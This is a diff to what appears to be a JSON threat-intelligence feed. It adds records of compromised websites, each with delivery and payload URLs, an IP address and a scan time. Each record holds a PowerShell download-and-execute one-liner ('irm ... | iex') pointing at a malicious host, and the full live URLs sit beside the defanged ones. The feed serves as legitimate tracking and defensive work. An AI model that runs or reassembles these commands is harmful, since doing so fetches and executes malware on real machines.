@@ -1,5 +1,81 @@
 [
   {
+    "UrlDomain": "gruendlers.com.tr",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/33a0fd33ff31f556"
+    ],
+    "IP": [
+      "91.151.82.191"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/33a0fd33ff31f556')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/33a0fd33ff31f556"
+    ],
+    "ReportId": "cmwmngqk01tqp0omlslirqrdy",
+    "ScannedAt": "2026-11-18T21:45:12.567000+00:00"
+  },
+  {
+    "UrlDomain": "daithangfood.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/72a22e04bfde613c"
+    ],
+    "IP": [
+      "103.28.39.9"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/72a22e04bfde613c')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/72a22e04bfde613c"
+    ],
+    "ReportId": "cmwmngbn11tq10omlskwnk4t3",
+    "ScannedAt": "2026-11-18T21:44:53.281000+00:00"
+  },
+  {
+    "UrlDomain": "delhidda.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/51465b6b04dc16ac"
+    ],
+    "IP": [
+      "104.21.21.212"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/51465b6b04dc16ac')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/51465b6b04dc16ac"
+    ],
+    "ReportId": "cmwmnfqnc1tp70oml3we4437f",
+    "ScannedAt": "2026-11-18T21:44:26.079000+00:00"
+  },
+  {
+    "UrlDomain": "asiancon.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/723cf4360f5743be"
+    ],
+    "IP": [
+      "5.189.171.100"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/723cf4360f5743be')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/723cf4360f5743be"
+    ],
+    "ReportId": "cmwmnff871tna0omlqrlqhndl",
+    "ScannedAt": "2026-11-18T21:44:11.264000+00:00"
+  },
+  {
     "UrlDomain": "camptasticrentals.com",
     "DeliveryUrl": [
       "baseupdate2798.com"
